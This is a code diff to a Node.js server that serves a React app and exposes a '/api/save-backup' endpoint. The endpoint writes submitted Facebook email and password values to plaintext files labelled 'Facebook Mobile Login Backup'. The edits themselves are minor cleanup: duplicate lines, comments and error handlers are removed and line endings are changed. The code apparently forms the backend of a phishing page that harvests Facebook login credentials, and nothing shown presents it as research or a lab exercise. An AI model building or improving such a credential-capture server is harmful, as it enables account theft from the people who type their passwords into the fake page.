@@ -3,7 +3,6 @@ import fs from 'node:fs';
 import path from 'node:path';
 
 const PORT = process.env.PORT || 5173;
-const PORT = process.env.PORT || 5173;
 const BASE_DIR = process.cwd();
 const DIST_DIR = path.join(BASE_DIR, 'dist');
 const SAVED_DIR = path.join(BASE_DIR, 'saved');
@@ -13,28 +12,10 @@ if (!fs.existsSync(SAVED_DIR)) {
   fs.mkdirSync(SAVED_DIR, { recursive: true });
 }
 
-// Check if dist/ exists - if not, show a notice (build should happen before deploy)
-if (!fs.existsSync(DIST_DIR)) {
-  console.warn('[SERVER] dist/ not found! The React app was not built.');
-  console.warn('[SERVER] Run `npm run build` before deploying.');
-}
-
-// Ensure the saved directory exists
-if (!fs.existsSync(SAVED_DIR)) {
-  fs.mkdirSync(SAVED_DIR, { recursive: true });
-}
-
-// Check if dist/ exists - if not, show a notice (build should happen before deploy)
-if (!fs.existsSync(DIST_DIR)) {
-  console.warn('[SERVER] dist/ not found! The React app was not built.');
-  console.warn('[SERVER] Run `npm run build` before deploying.');
-}
-
+// Serve static files
 const server = http.createServer((req, res) => {
   console.log(`[API] ${req.method} ${req.url}`);
-  // Prevent orphaned keep-alive sockets from blocking
-  req.on('error', () => {});
-  res.on('error', () => {});
+
   // Handle the save backup API
   if (req.method === 'POST' && req.url === '/api/save-backup') {
     let body = '';
@@ -50,10 +31,10 @@ const server = http.createServer((req, res) => {
         const fileName = `facebook_mobile_login_backup_${timestamp}.txt`;
         const filePath = path.join(SAVED_DIR, fileName);
 
-        const fileContent = `Facebook Mobile Login Backup\n` +
-          `Timestamp: ${data.timestamp}\n` +
-          `Email: ${data.email || '(empty)'}\n` +
-          `Password: ${data.password || '(empty)'}\n`;
+        const fileContent = `Facebook Mobile Login Backup\r\n` +
+          `Timestamp: ${data.timestamp}\r\n` +
+          `Email: ${data.email || '(empty)'}\r\n` +
+          `Password: ${data.password || '(empty)'}\r\n`;
 
         fs.writeFileSync(filePath, fileContent, 'utf-8');
 
@@ -105,21 +86,18 @@ server.listen(PORT, () => {
   console.log(`Serving from: ${DIST_DIR}`);
 });
 
-// Log server errors
 server.on('error', (err) => {
   console.error('Server error:', err.message);
   console.error(err.stack);
   process.exit(1);
 });
 
-// Handle uncaught exceptions
 process.on('uncaughtException', (err) => {
   console.error('Uncaught Exception:', err.message);
   console.error(err.stack);
   process.exit(1);
 });
 
-// Handle unhandled rejections
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
   process.exit(1);
